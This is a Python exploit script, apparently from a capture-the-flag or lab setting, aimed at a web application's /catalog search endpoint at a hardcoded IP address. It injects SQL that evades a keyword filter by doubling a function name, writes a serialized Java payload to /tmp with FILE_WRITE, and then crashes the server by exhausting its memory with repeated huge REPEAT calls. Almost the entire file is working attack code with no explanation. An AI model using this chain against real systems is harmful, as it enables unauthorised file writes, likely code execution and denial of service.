import os
import time

import requests

JAR_PATH = "/app/app.jar"
TARGET_URL = "http://204.168.137.72:8080/"
TARGET_FILE = "/tmp/SESSIONS.ser"
if not os.path.exists("/tmp/SESSIONS.ser"):
    print("[-] SESSIONS.ser not found. Please generate it first.")
    exit(1)
with open("/tmp/SESSIONS.ser", "rb") as payload:
    binary_data = payload.read()
    HEX_PAYLOAD = binary_data.hex()


def stage_1_write_file():
    print("[*] Stage 1: Writing SESSIONS.ser using Concatenation Bypass...")

    #
    bypass_func = "FILFILE_WRITEE_WRITE"

    # Payload: a'||FUNCTION(args)||'b
    # This results in: LIKE '%a'||FILE_WRITE(...)||'b%'
    stealth_payload = f"a'||{bypass_func}(X'{HEX_PAYLOAD}','{TARGET_FILE}')||'b"

    params = {"search": stealth_payload}

    try:
        r = requests.get(f"{TARGET_URL}/catalog", params=params)

        # Check if we still get the "harmful characters" error
        if "Search Error" in r.text:
            print(
                "[-] FAIL: HardBlockFilter is still too strong. Check for ( or , blocks."
            )
            return False

        print(
            "[+] Request accepted by filter! If status is 200, check /tmp/SESSIONS.ser."
        )
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def trigger_forceful_restart():
    print(f"[*] Bypassing conversion error to force OOM...")

    # Use REPEAT to trigger an instant OOM!.
    payload = f"a'||REPEAT('A', 1000000000)||'b"

    params = {"search": payload}

    try:
        for i in range(1, 20):
            print(f"    [>] Saturating Heap - Request #{i}...", end="\r")
            try:
                requests.get(f"{TARGET_URL}/catalog", params=params, timeout=1)
            except requests.exceptions.Timeout:
                pass

    except requests.exceptions.ConnectionError:
        print("\n[+] Success! Connection reset. PID 1 has crashed.")


if __name__ == "__main__":
    if stage_1_write_file():
        time.sleep(2)
        trigger_forceful_restart()
    else:
        exit(1)
